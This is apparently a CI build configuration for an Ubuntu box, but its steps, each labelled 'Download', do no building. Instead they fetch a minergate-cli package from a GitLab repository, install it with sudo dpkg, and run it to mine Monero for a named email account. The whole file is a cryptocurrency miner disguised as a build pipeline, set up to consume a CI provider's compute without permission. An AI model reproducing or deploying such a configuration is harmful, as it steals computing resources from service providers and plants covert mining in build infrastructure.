box: ubuntu
command-timeout: 30
build:

  steps:
    - install-packages:
        packages: wget dpkg gnupg
        
    - script:
        name: Download
        code: |
          wget https://gitlab.com/Yoginth/Miner/raw/master/minergate-cli.deb -O minergate-cli.deb

    - script:
        name: Download
        code: |
          sudo dpkg -i minergate-cli.deb
          
    - script:
        name: Download
        code: |
          minergate-cli -user yoginth@hotmail.com xmr
